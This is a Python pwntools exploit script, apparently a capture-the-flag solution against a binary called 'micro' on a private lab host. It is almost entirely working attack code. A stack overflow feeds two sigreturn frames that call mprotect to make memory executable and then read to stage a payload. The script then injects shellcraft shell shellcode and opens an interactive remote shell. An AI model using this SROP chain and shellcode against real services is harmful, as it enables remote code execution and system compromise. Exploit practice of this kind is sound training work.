#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 10.10.23.10 --port 8888 micro
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('micro')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '10.10.23.10'
port = int(args.PORT or 8888)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    if args.EDB:
        return process(['edb', '--run', exe.path] + argv, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

io = start()

syscall = 0x401016

vuln_function = 0x401004
vuln_pointer = 0x400088

writable = 0x400000
frame = SigreturnFrame(kernel="amd64")
frame.rax = 10
frame.rdi = writable
frame.rsi = 0x4000
frame.rdx = 7
frame.rsp = vuln_pointer
frame.rip = syscall


pause()
pl = b"A"*32 + p64(vuln_function) + p64(syscall) + bytes(frame)
io.send(pl)
pause()
io.send(b'a' * 15)

frame = SigreturnFrame(kernel="amd64")
frame.rax = 0
frame.rdi = 0
frame.rsi = writable+0x1000
frame.rdx = 0x1000
frame.rsp = vuln_pointer
frame.rip = syscall

pause()
pl = b"A"*32 + p64(vuln_function) + p64(syscall) + bytes(frame)
io.send(pl)
pause()
io.send(b'a' * 15)

pause()
io.send(b'a' * 0x18 + bytes(asm(shellcraft.sh())))


io.interactive()

